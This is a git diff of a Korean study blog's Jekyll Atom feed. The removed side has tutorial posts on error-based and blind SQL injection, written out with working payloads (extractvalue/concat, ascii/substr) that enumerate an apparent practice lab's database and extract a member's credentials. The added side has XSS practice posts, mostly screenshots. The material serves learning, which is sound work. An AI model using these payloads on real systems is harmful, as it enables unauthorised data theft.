@@ -1,6 +1,6 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-06-01T14:03:23+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">나의 코딩 공부</title><subtitle>ethan의 블로그</subtitle><author><name>ethan</name></author><entry><title type="html">SQL injection 데이터 추출(3)</title><link href="http://localhost:4000/sql-injection/SQLinjection15/" rel="alternate" type="text/html" title="SQL injection 데이터 추출(3)" /><published>2024-06-01T00:00:00+09:00</published><updated>2024-06-01T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection15</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection15/"><![CDATA[<p><br /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-06-20T02:42:01+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">나의 코딩 공부</title><subtitle>ethan의 블로그</subtitle><author><name>ethan</name></author><entry><title type="html">XSS 취약점 찾기(1)</title><link href="http://localhost:4000/xss/XSS2/" rel="alternate" type="text/html" title="XSS 취약점 찾기(1)" /><published>2024-06-18T00:00:00+09:00</published><updated>2024-06-18T00:00:00+09:00</updated><id>http://localhost:4000/xss/XSS2</id><content type="html" xml:base="http://localhost:4000/xss/XSS2/"><![CDATA[<p><br /></p>
 
-<h1 id="1-sql-injection-데이터-추출3"><span style="background:#000000; color:#ffffff">1. SQL injection 데이터 추출(3)</span></h1>
+<h1 id="1-xss-취약점-찾기1"><span style="background:#000000; color:#ffffff">1. XSS 취약점 찾기(1)</span></h1>
 
 <p><br /><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>
 
@@ -10,331 +10,37 @@
 
 <p><br /></p>
 
-<h2 id="11-개요"><span style="background:#696969; color:#ffffff">1.1 개요 </span></h2>
+<h2 id="11-xss-1-문제-"><span style="background:#696969; color:#ffffff">1.1 XSS 1 문제 </span></h2>
 
 <p><br /></p>
 
-<p>저번 SQL injection 데이터 추출(2) 포스팅에서 DB데이터가 화면에 출력 될 때 SQL Injection을 해보았습니다.<br />
-사실 데이터 추출 방식에는 3 가지 방식이 있습니다.</p>
+<p><img src="C:\Users\ljj01\OneDrive\바탕 화면\프로그램\ethanvolg.github.io\images\Untitled\image-20240618015745282.png" alt="image-20240618015745282" style="zoom:67%;" /></p>
 
-<p><br /></p>
+<p>게시판에 먼저 들어가서 글을 작성하여 어떻게 나타나는지 확인 하였다.</p>
 
-<p><span style="font-weight:bold; font-size:15px">1. SQL 질의 문 결과가 화면에 출력 되는 경우(데이터추출(2)) =&gt; UNION SQLi (로그인 or 게시판 등)</span></p>
+<p><img src="/images/2024-06-18-XSS2/image-20240618020616108.png" alt="image-20240618020616108" style="zoom:60%;" /></p>
 
-<p><span style="font-weight:bold; font-size:15px">2. 에러 메세지가 화면에 출력 되는 경우 =&gt; Error Based SQLi (에러 메세지 확인 가능 한 곳)</span></p>
+<p><img src="/images/2024-06-18-XSS2/image-20240618020310214.png" alt="image-20240618020310214" style="zoom:80%;" /></p>
 
-<p><span style="font-weight:bold; font-size:15px">3. 참과 거짓으로 출력 되는 경우 =&gt; Blind SQLi (로그인 or 아이디 중복 체크 등)</span></p>
+<p>제목, 본문 내용이 적은 대로 잘 작성되는지 확인이 가능했다.<br />
+따라서 stored xss 를 시도해 볼만 하다.</p>
 
-<p>와 같은 방식으로 해결할 수 있습니다.</p>
+<p><img src="/images/2024-06-18-XSS2/image-20240618020654991.png" alt="image-20240618020654991" style="zoom:60%;" /></p>
 
-<p><br /></p>
+<p><img src="/images/2024-06-18-XSS2/image-20240618020439799.png" alt="image-20240618020439799" style="zoom:80%;" /></p>
 
-<p>이번 포스팅에서는 2 번을 배워보도록 합시다.</p>
+<p>사용 가능한 특수 문자를 체크 하기 위해 위와 같이 작성하였고, 본문이 아닌 제목에서는 잘 작성되는 것을 볼 수 있기 때문에<br />
+제목에 악성 스크립트를 작성할 수 있을 것 같다.</p>
 
-<p><br /></p>
+<p><img src="/images/2024-06-18-XSS2/image-20240618020541625.png" alt="image-20240618020541625" style="zoom:60%;" /></p>
 
-<h2 id="12-error-based-sql-injection에러-메세지를-출력하여-화면에서-볼-수-있을때"><span style="background:#696969; color:#ffffff">1.2  Error Based SQL Injection<span style="font-size:50%">(에러 메세지를 출력하여 화면에서 볼 수 있을때)</span></span></h2>
+<p><img src="/images/2024-06-18-XSS2/image-20240618020741759.png" alt="image-20240618020741759" style="zoom:80%;" /></p>
 
-<p><br /></p>
+<p><img src="/images/2024-06-18-XSS2/image-20240618020757114.png" alt="image-20240618020757114" style="zoom: 50%;" /></p>
 
-<h3 id="121-필요한-개념"><span style="background:#909090; color:#ffffff">1.2.1 필요한 개념</span></h3>
+<p>스크립트를 작성해보니 잘 삽입되어, 나타나는 것을 확인할 수 있다.</p>]]></content><author><name>ethan</name></author><category term="XSS" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">XSS 취약점 찾기(6)</title><link href="http://localhost:4000/xss/XSS7/" rel="alternate" type="text/html" title="XSS 취약점 찾기(6)" /><published>2024-06-18T00:00:00+09:00</published><updated>2024-06-18T00:00:00+09:00</updated><id>http://localhost:4000/xss/XSS7</id><content type="html" xml:base="http://localhost:4000/xss/XSS7/"><![CDATA[<p><br /></p>
 
-<hr />
-
-<p>Error Based SQl Injection은 무엇일까요?<br />
-에러 메세지를 활용해서 데이터를 출력하는 방식입니다.</p>
-
-<p>활용하기 위해서는 조건이 필요합니다.</p>
-
-<p><br /></p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601034401789.png" alt="image-20240601034401789" style="zoom: 67%;" /></p>
-
-<p><br /></p>
-
-<p>먼저 SQL에러가 무엇일까요?<br />
-SQL에러는 SQL쿼리에서 발생하는 에러를 뜻합니다.</p>
-
-<p>그렇다면 문법 에러와 로직 에러가 어떤 점이 다른 지 살펴보겠습니다.</p>
-
-<p><br /></p>
-
-<p><br /></p>
-
-<p><span style="font-weight:bold; font-size:22px"> 〈문법 에러〉 </span></p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601023835764.png" alt="image-20240601023835764" style="zoom: 60%;" /></p>
-
-<p>문법 에러란 ?  sql 쿼리 문이 제대로 된 문법으로 작성되어서 sql에서 요구하는 언어적 문제가 있는지 없는지 보는 것입니다. <br />
-만약 문법 에러가 난다면, 위와 같은 이미지처럼 SQL syntax라고 뜨며, SQL 요청이 거부되어 실행조차 될 수 없습니다. <br />
-Error based SQLi (sql injection)는 sql이 작동하면서, 에러 메세지를 통해 데이터를 추출해내는 기법이므로 문법 에러가<br />
-뜨지 않도록 주의해야 합니다.</p>
-
-<p><br /></p>
-
-<p><br /></p>
-
-<p><span style="font-weight:bold; font-size:22px"> 〈로직 에러〉 </span></p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601025713759.png" alt="image-20240601025713759" style="zoom:80%;" /></p>
-
-<p>위의 이미지처럼 작성한다면, 문법적으로 위배되지 않습니다. 하지만 text라는 column , hi 라는 값은 존재하지 않습니다.<br />
-이처럼 제대로 된 지정된 값을 사용하지 않으면, 로직 에러가 나타나게 됩니다. <br />
-<br /></p>
-
-<p>그치만 위와 같이 쓴다면, 오류 메세지를 확인하는 것은 가능하나 데이터를 추출할 수 없습니다.</p>
-
-<p><br /></p>
-
-<p><span style="font-weight:bold; font-size:20px">😊extractvalue()함수를  <span style="text-decoration: red wavy underline">사용하는 이유:</span>😊</span></p>
-
-<p><code class="language-plaintext highlighter-rouge">extractvalue ()</code> 함수는 XML 문자열에서 지정된 XPath 표현식에 해당하는 데이터를 추출하는 데 사용됩니다.</p>
-
-<p>따라서 에러 메세지가 발생하면, XPath 표현식에 해당하는 데이터를 추출하면서 오류 메세지가 나타나기 때문에<br />
-Error based SQLi에 사용하기 적합합니다.</p>
-
-<p><br /></p>
-
-<p><span style="font-weight:bold; font-size:20px">😊extractvalue()함수를 <span style="text-decoration: red wavy underline">사용하는 법:</span>😊</span> <br />
-<br /></p>
-
-<p>■<span style="font-weight:bold; font-size:20px">[</span><span style="font-size:19px">기본적인 함수 사용법</span><span style="font-weight:bold; font-size:18px">]</span> (<span style="color:red">참고</span>)</p>
-
-<details>
-<summary style="font-size:15px">접기/펼치기</summary>
-<div>
-    <p><br />extractvalue(‘xml 데이터’, ‘xml 표현식’)<br />
-<code class="language-plaintext highlighter-rouge">idx</code> 칼럼에 다음과 같은 XML 데이터가 저장되어 있다고 합시다:</p>
-
-    <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;user&gt;</span>
-<span class="nt">&lt;name&gt;</span>LEE<span class="nt">&lt;/name&gt;</span>
-<span class="nt">&lt;email&gt;</span>LEE@example.com<span class="nt">&lt;/email&gt;</span>
-<span class="nt">&lt;/user&gt;</span>
-</code></pre></div>    </div>
-
-    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="s1">'/user/name'</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">tableName</span><span class="p">;</span>
-</code></pre></div>    </div>
-
-    <p>이 쿼리는 <code class="language-plaintext highlighter-rouge">tableName</code>에서 <code class="language-plaintext highlighter-rouge">idx</code> 칼럼에 저장된 XML 데이터 중 <code class="language-plaintext highlighter-rouge">&lt;user&gt;</code> 태그의 하위 <code class="language-plaintext highlighter-rouge">&lt;name&gt;</code> 태그에 해당하는 값을 추출하여 <code class="language-plaintext highlighter-rouge">name</code>이라는 이름으로 반환합니다.   <br />
-<code class="language-plaintext highlighter-rouge">idx</code> 는 또한 ‘ 〈user〉 〈name〉 LEE 〈/name〉 〈email〉 LEE@example.com 〈/email〉 〈/user〉 ‘로 표현 가능.</p>
-
-    <div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gi">+-----------+
-</span>|    name   |
-<span class="gi">+-----------+
-</span>|    LEE    |
-<span class="gi">+-----------+
-</span></code></pre></div>    </div>
-
-    <p>열 제목은 ‘name’으로, 추출된 값은 “LEE”입니다.<br />
-이러한 방식으로 LEE라는 데이터를 추출해 냅니다.</p>
-
-  </div>
-</details>
-<p><br /></p>
-
-<p>■<span style="font-weight:bold; font-size:19px">[</span><span style="font-size:19px">SQLi에서 함수 사용법</span><span style="font-weight:bold; font-size:18px">]</span><br />
-<br /></p>
-
-<p><span style="font-size:17px ;line-height:20px; word-spacing:5px;letter-spacing : 3px">※알아야 할 개념※</span></p>
-
-<p><br /></p>
-
-<p>👉<span style="font-size:17px"> <code class="language-plaintext highlighter-rouge">XPATH syntax error</code>가  발생하는 특수 문자</span></p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601081057098.png" alt="image-20240601081057098" style="zoom:67%;" /></p>
-
-<p>위 이미지처럼 xml 데이터는 상관없고, xml 표현 식에 : , ! , # , % 등등 특수 문자를 앞에 넣게 되면 <br />
-xpath syntax error가 뜨면서 해당 자리의 값이 추출하는 특징을 갖고 있습니다.<br />
-이 데이터를 추출되는 것을 이용하여, select문을 삽입하여 db데이터를 추출하는 방법을 이용할 것입니다.</p>
-
-<p><br /></p>
-
-<p><span style="font-size:17px"> 👉<code class="language-plaintext highlighter-rouge">concat()</code>함수 </span></p>
-
-<p>concat(‘a’,’b’) —–&gt; ab<br />
-concat(‘0x3a’, ‘test’) ——&gt; :test</p>
-
-<p>ex)   : 의 16진수는 0x3a , !의 16진수는 0x21, #의 16진수는 0x23……..</p>
-
-<p><br /></p>
-
-<p><br /></p>
-
-<h3 id="122-데이터-추출의-과정에러-메세지를-화면으로-볼-수-있을-때"><span style="background:#909090; color:#ffffff">1.2.2 데이터 추출의 과정<span style="font-size:50%">(에러 메세지를 화면으로 볼 수 있을 때)</span></span></h3>
-
-<hr />
-
-<p><br /></p>
-
-<p><span style="font-weight:bold; font-size:20px">〈 Error Based 이용한 sql injection pocess 〉</span></p>
-
-<p><br /></p>
-
-<p><span style="font-weight:bold; font-size:15px">1. sql injection 포인트 찾기 (sql injection이 가능한지 확인하고, 어떤 로직으로 구성했을까? 예측하기)</span></p>
-
-<p><span style="font-weight:bold; font-size:15px">2. 에러 출력 함수</span></p>
-
-<p><span style="font-weight:bold; font-size:15px">3. 공격 format 만들기</span></p>
-
-<p><span style="font-weight:bold; font-size:15px">4. DB이름 확인하기</span></p>
-
-<p><span style="font-weight:bold; font-size:15px">5. table이름 확인하기</span></p>
-
-<p><span style="font-weight:bold; font-size:15px">6. column 이름 확인하기</span></p>
-
-<p><span style="font-weight:bold; font-size:15px">7. data 추출하기</span></p>
-
-<p>예제에 따라 해당 절차를 시행해보면서 설명해보겠습니다.</p>
-
-<p><br /></p>
-
-<h4 id="1221-sql-injection-포인트-찾기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.1 sql injection 포인트 찾기</span></h4>
-
-<hr />
-<p><br /></p>
-
-<p>기본적으로 Error Based SQLi를 적용하려면 SQL 에러를 화면에 출력 되어야 하므로,</p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601094626149.png" alt="image-20240601094626149" style="zoom:50%;" /></p>
-
-<p>SQL에러 와 관련된 에러가 발생하는지 확인한다.</p>
-
-<p><br /></p>
-
-<h4 id="1222--에러-출력-함수"><span style="background:#A9A9A9; color:#ffffff">1.2.2.2  에러 출력 함수</span></h4>
-
-<hr />
-<p><br /></p>
-
-<p>(대표적)<strong><code class="language-plaintext highlighter-rouge">EXTRACTVALUE()</code></strong>
-or <strong><code class="language-plaintext highlighter-rouge">CAST()</code></strong>와<strong><code class="language-plaintext highlighter-rouge">CONVERT()</code></strong> 등을 이용.</p>
-
-<p><br /></p>
-
-<h4 id="1223-공격-format-만들기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.3 공격 format 만들기</span></h4>
-
-<hr />
-<p><br /></p>
-
-<p>’ and extractvalue(‘1’,concat(0x3a,(select ‘test’))) and ‘1’=’1</p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601100910338.png" alt="image-20240601100910338" style="zoom:67%;" /></p>
-
-<p>문법 에러가 나타나지 않으면서, 로직 에러가 나타나는 것 까지 확인 했습니다!</p>
-
-<p><br /></p>
-
-<p>따라서</p>
-
-<p>’ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and ‘1’=’1</p>
-
-<p>이와 같이 select 부분만 바꿔서 계속 쓸 수 있도록 공격 format을 만들 수 있습니다.</p>
-
-<p><br /></p>
-
-<h4 id="1224-db이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.4 DB이름 확인하기</span></h4>
-
-<hr />
-<p><br /></p>
-
-<p>DB 이름 확인하는 법은 <br />
-select database() 이므로, <br />
-<br /></p>
-
-<p>공격 format <br />
-‘ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and ‘1’=’1<br />
-에 대입한다. <br />
-<br /></p>
-
-<p>’ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select database() limit 0,1</span>))) and ‘1’=’1</p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601101741238.png" alt="image-20240601101741238" style="zoom:67%;" /></p>
-
-<p><br /></p>
-
-<h4 id="1225-table이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.5 table이름 확인하기</span></h4>
-
-<hr />
-<p><br /></p>
-
-<p>table 이름 확인하는 법은<br />
-select table_name from information_schema.tables where table_schema=’DB name’ limit 0,1 이므로, <br />
-<br /></p>
-
-<p>공격 format<br />
-‘ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and ‘1’=’1<br />
-에 대입한다. <br />
-<br /></p>
-
-<p>’ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select table_name from information_schema.tables where table_schema=’segfault_sql’ limit 0,1 </span>))) and ‘1’=’1</p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102131068.png" alt="image-20240601102131068" style="zoom:67%;" />[limit 0,1]</p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102219083.png" alt="image-20240601102219083" style="zoom:67%;" />[limit 1,1]</p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102338714.png" alt="image-20240601102338714" style="zoom:67%;" />[limit 2,1]</p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102414956.png" alt="image-20240601102414956" style="zoom:67%;" />[limit 3,1]</p>
-
-<p><br /></p>
-
-<h4 id="1226-column-이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.6 column 이름 확인하기</span></h4>
-
-<hr />
-<p><br /></p>
-
-<p>column 이름 확인하는 법은<br />
-select column_name from information_schema.columns where table_name=’table name’ limit 0,1 이므로, <br />
-<br /></p>
-
-<p>공격 format<br />
-‘ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and ‘1’=’1<br />
-에 대입한다.<br />
-<br /></p>
-
-<p>’ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select column_name from information_schema.columns where table_name=’member’ limit 0,1</span>))) and ‘1’=’1</p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102826831.png" alt="image-20240601102826831" style="zoom:67%;" />[limit 0,1]</p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102900086.png" alt="image-20240601102900086" style="zoom:67%;" />[limit 1,1]</p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102928085.png" alt="image-20240601102928085" style="zoom:67%;" />[limit 2,1]</p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103001659.png" alt="image-20240601103001659" style="zoom:67%;" />[limit 3,1]</p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103026201.png" alt="image-20240601103026201" style="zoom:67%;" />[limit 4,1]</p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103053717.png" alt="image-20240601103053717" style="zoom:67%;" />[limit 5,1]</p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103136119.png" alt="image-20240601103136119" style="zoom:67%;" />[limit 6,1]</p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103203656.png" alt="image-20240601103203656" style="zoom:67%;" />[limit 7,1]</p>
-
-<p>이런 식으로 컬럼을 알 수 있다.</p>
-
-<p><br /></p>
-
-<h4 id="1227-data-추출하기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.7 data 추출하기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>같은 방식으로 <br />
-select flag from flagTable limit 0,1<br />
-<br /></p>
-
-<p>’ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select id from member limit 0,1</span>))) and ‘1’=’1</p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103508970.png" alt="image-20240601103508970" style="zoom:67%;" /></p>
-
-<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103530142.png" alt="image-20240601103530142" style="zoom:67%;" /></p>
-
-<p>doldol의 아이디와 비밀번호를 알 수 있습니다.</p>
-
-<p><br /></p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SQL injection 데이터 추출(4)</title><link href="http://localhost:4000/sql-injection/SQLinjection16/" rel="alternate" type="text/html" title="SQL injection 데이터 추출(4)" /><published>2024-06-01T00:00:00+09:00</published><updated>2024-06-01T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection16</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection16/"><![CDATA[<p><br /></p>
-
-<h1 id="1-sql-injection-데이터-추출4"><span style="background:#000000; color:#ffffff">1. SQL injection 데이터 추출(4)</span></h1>
+<h1 id="1-xss-취약점-찾기6"><span style="background:#000000; color:#ffffff">1. XSS 취약점 찾기(6)</span></h1>
 
 <p><br /><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>
 
@@ -344,257 +50,13 @@ select flag from flagTable limit 0,1<br />
 
 <p><br /></p>
 
-<h2 id="11-개요"><span style="background:#696969; color:#ffffff">1.1 개요 </span></h2>
+<h2 id="11-xss-6-문제-"><span style="background:#696969; color:#ffffff">1.1 XSS 6 문제 </span></h2>
 
 <p><br /></p>
 
-<p>SQL injection 데이터 추출 방식에는 3 가지 방식이 있습니다.</p>
+<p><img src="/images/2024-06-18-XSS7/image-20240618023836967.png" alt="image-20240618023836967" style="zoom:50%;" /></p>]]></content><author><name>ethan</name></author><category term="XSS" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">XSS 취약점 찾기(5)</title><link href="http://localhost:4000/xss/XSS6/" rel="alternate" type="text/html" title="XSS 취약점 찾기(5)" /><published>2024-06-18T00:00:00+09:00</published><updated>2024-06-18T00:00:00+09:00</updated><id>http://localhost:4000/xss/XSS6</id><content type="html" xml:base="http://localhost:4000/xss/XSS6/"><![CDATA[<p><br /></p>
 
-<p><br /></p>
-
-<p><span style="font-weight:bold; font-size:15px">1. SQL 질의 문 결과가 화면에 출력 되는 경우(데이터추출(2)) =&gt; UNION SQLi (로그인 or 게시판 등)</span></p>
-
-<p><span style="font-weight:bold; font-size:15px">2. 에러 메세지가 화면에 출력 되는 경우(데이터추출(3)) =&gt; Error Based SQLi (에러 메세지 확인 가능 한 곳)</span></p>
-
-<p><span style="font-weight:bold; font-size:15px">3. 참과 거짓으로 출력 되는 경우 =&gt; Blind SQLi (로그인 or 아이디 중복 체크 등)</span></p>
-
-<p>와 같은 방식으로 해결할 수 있습니다.</p>
-
-<p><br /></p>
-
-<p>이번 포스팅에서는 3 번을 배워보도록 합시다.</p>
-
-<p><br /></p>
-
-<h2 id="12-blind-sql-injection참-거짓-정도만-출력되는-경우"><span style="background:#696969; color:#ffffff">1.2  Blind SQL injection<span style="font-size:50%">(참, 거짓 정도만 출력되는 경우)</span></span></h2>
-
-<p><br /></p>
-
-<h3 id="121-개요"><span style="background:#909090; color:#ffffff">1.2.1 개요</span></h3>
-
-<hr />
-
-<p><br /></p>
-
-<p><img src="/images/2024-06-01-SQLinjection16/image-20240601124800301.png" alt="image-20240601124800301" style="zoom:67%;" /></p>
-
-<p>blind sqli 같은 경우는 sql 에러 마저 출력 되지 않고, 참 거짓 정도 밖에 알 수 없는 상태일 때 이용합니다.  <br />
-그래서 한 글자 한 글자가 맞는 지 틀린 지를 참 거짓의 정보를 통해 알아냅니다.</p>
-
-<p>수작업을 하는 것이 굉장히 시간이 오래 걸리기 때문에, 정보가 충분하다면 사용하지 않습니다.<br />
-또는 python 과 같은 다른 프로그램 언어를 통해 자동화를 만들기도 합니다.</p>
-
-<p><br /></p>
-
-<h3 id="122-필요한-개념"><span style="background:#909090; color:#ffffff">1.2.2 필요한 개념</span></h3>
-
-<hr />
-
-<p><br /></p>
-
-<p>👉<span style="font-size:17px"> <strong><code class="language-plaintext highlighter-rouge">Substr()</code></strong>: 글자를 잘라주는 역할</span></p>
-
-<p>substr(글자, index 1부터 시작, 글자개수)</p>
-
-<p>예) <br />
-substr(‘test’,1,1) ▶ ‘t’<br />
-substr(‘test’,2,1) ▶ ‘e’<br />
-substr(‘test’,1,2) ▶ ‘te’</p>
-
-<p><br /></p>
-
-<p>👉<span style="font-size:17px"> <strong><code class="language-plaintext highlighter-rouge">ascii()</code></strong>: 글자를 숫자로 바꿔줌</span></p>
-
-<p>예)<br />
-ascii(‘a’)=97</p>
-
-<p><img src="/images/2024-06-01-SQLinjection16/image-20240601121547715.png" alt="image-20240601121547715" /></p>
-
-<p>둘 개념을 적용하여, ascii(substr(select~~),1,1)) 를 쓰게 되면 불러온 데이터의 한 글자가 숫자로 치환된다.</p>
-
-<p>이를 출력하여 직접 볼 수 는 없고, 이 숫자를 updown으로 판별하여 한 글자를 알 수 있게 된다.</p>
-
-<p>예 ) <br />
-ascii(substr(select~~),1,1)) &gt;0 이 참이면, 글자가 존재한다는 뜻이다. 거짓이면, 글자가 존재하지 않는다는 뜻이다.</p>
-
-<p>ascii(substr(select ‘a’),1,1)) &gt; 70 이 참이므로, 점차 숫자를 높여 나간다.  <br />
-ascii(substr(select ‘a’),1,1)) = 97</p>
-
-<p>ascii(substr(select ‘!’),1,1)) &lt; 70 이 참이므로, 점차 숫자를 낮춰 나간다.<br />
-ascii(substr(select ‘!’),1,1)) = 33
-<br /></p>
-
-<h3 id="123-데이터-추출의-과정참-거짓을-화면으로-볼-수-있을-때"><span style="background:#909090; color:#ffffff">1.2.3 데이터 추출의 과정<span style="font-size:50%">(참, 거짓을 화면으로 볼 수 있을 때)</span></span></h3>
-
-<hr />
-
-<p><br /><span style="font-weight:bold; font-size:20px">〈 Blind 이용한 sql injection pocess 〉</span></p>
-
-<p><br /></p>
-
-<p><span style="font-weight:bold; font-size:15px">1. sql injection 포인트 찾기 (sql injection이 가능한지 확인하고, 어떤 로직으로 구성했을까? 예측하기)</span></p>
-
-<p><span style="font-weight:bold; font-size:15px">2. select 문구가 사용가능한 지 체크</span></p>
-
-<p><span style="font-weight:bold; font-size:15px">3. 공격 format 만들기</span></p>
-
-<p><span style="font-weight:bold; font-size:15px">4. DB이름 확인하기</span></p>
-
-<p><span style="font-weight:bold; font-size:15px">5. table이름 확인하기</span></p>
-
-<p><span style="font-weight:bold; font-size:15px">6. column 이름 확인하기</span></p>
-
-<p><span style="font-weight:bold; font-size:15px">7. data 추출하기</span></p>
-
-<p>예제에 따라 해당 절차를 시행해보면서 설명해보겠습니다.</p>
-
-<p><br /></p>
-
-<p><br /></p>
-
-<h4 id="1221-sql-injection-포인트-찾기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.1 sql injection 포인트 찾기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p><img src="/images/2024-06-01-SQLinjection16/image-20240601125007358.png" alt="image-20240601125007358" style="zoom:67%;" /></p>
-
-<p>SQL 구문을 사용할 수 있고, 참 거짓을 확인 할 수 있다</p>
-
-<p>▶ Blind sqli 가능!</p>
-
-<p><br /></p>
-
-<h4 id="1222--select-문구가-사용가능한-지-체크"><span style="background:#A9A9A9; color:#ffffff">1.2.2.2  select 문구가 사용가능한 지 체크</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p><img src="/images/2024-06-01-SQLinjection16/image-20240601125219643.png" alt="image-20240601125219643" style="zoom:67%;" /></p>
-
-<p><img src="/images/2024-06-01-SQLinjection16/image-20240601125237816.png" alt="image-20240601125237816" style="zoom:67%;" /></p>
-
-<p>중간 and 문에도 참 거짓이 확인 됨
-▶ Blind sqli 가능!</p>
-
-<p><img src="/images/2024-06-01-SQLinjection16/image-20240601125358300.png" alt="image-20240601125358300" style="zoom:67%;" /></p>
-
-<p><img src="/images/2024-06-01-SQLinjection16/image-20240601125648850.png" alt="image-20240601125648850" style="zoom:67%;" /></p>
-
-<p>select문으로 바꿔서 작성해도 참 거짓 확인 됨</p>
-
-<p>▶ Blind sqli 가능!</p>
-
-<p><br /></p>
-
-<h4 id="1223-공격-format-만들기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.3 공격 format 만들기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>normaltic’ and ascii(substr((select ‘test’),1,1)&gt;0) and ‘1’=’1</p>
-
-<p><img src="/images/2024-06-01-SQLinjection16/image-20240601125950843.png" alt="image-20240601125950843" style="zoom:67%;" /></p>
-
-<p>위의 구문 대로 라면 t가 나와야 한다. 그게 0보다 크므로 글자가 존재한다는 뜻이다.</p>
-
-<p><br /></p>
-
-<p>따라서</p>
-
-<p>normaltic’ and ascii(substr((<span style="font-weight:bold; color: orange">select~~~</span>),1,1)&gt;0) and ‘1’=’1</p>
-
-<p>이와 같이 select 부분만 바꿔서 계속 쓸 수 있도록 공격 format을 만들 수 있습니다.</p>
-
-<p><br /></p>
-
-<h4 id="1224-db이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.4 DB이름 확인하기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>DB 이름 확인하는 법은 <br />
-select database() 이므로, <br />
-<br /></p>
-
-<p>공격 format <br />
-normaltic’ and ascii(substr((<span style="font-weight:bold; color: orange">select~~~</span>),1,1)&gt;0) and ‘1’=’1<br />
-에 대입한다. <br />
-<br /></p>
-
-<p>normaltic’ and ascii(substr((<span style="font-weight:bold; color: orange">select database() limit 0,1</span>),1,1)&gt;0) and ‘1’=’1</p>
-
-<p>찾을 때 burp suite을 이용하면 간편하다…..이 직접 찾는 것은 문제 풀이 포스팅에서 깊이 다루도록 하겠습니다.</p>
-
-<p><img src="/images/2024-06-01-SQLinjection16/image-20240601130937018.png" alt="image-20240601130937018" style="zoom:67%;" /></p>
-
-<p><br /></p>
-
-<h4 id="1225-table이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.5 table이름 확인하기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>table 이름 확인하는 법은<br />
-select table_name from information_schema.tables where table_schema=’DB name’ limit 0,1 이므로, <br />
-<br /></p>
-
-<p>공격 format <br />
-normaltic’ and ascii(substr((<span style="font-weight:bold; color: orange">select~~~</span>),1,1)&gt;0) and ‘1’=’1<br />
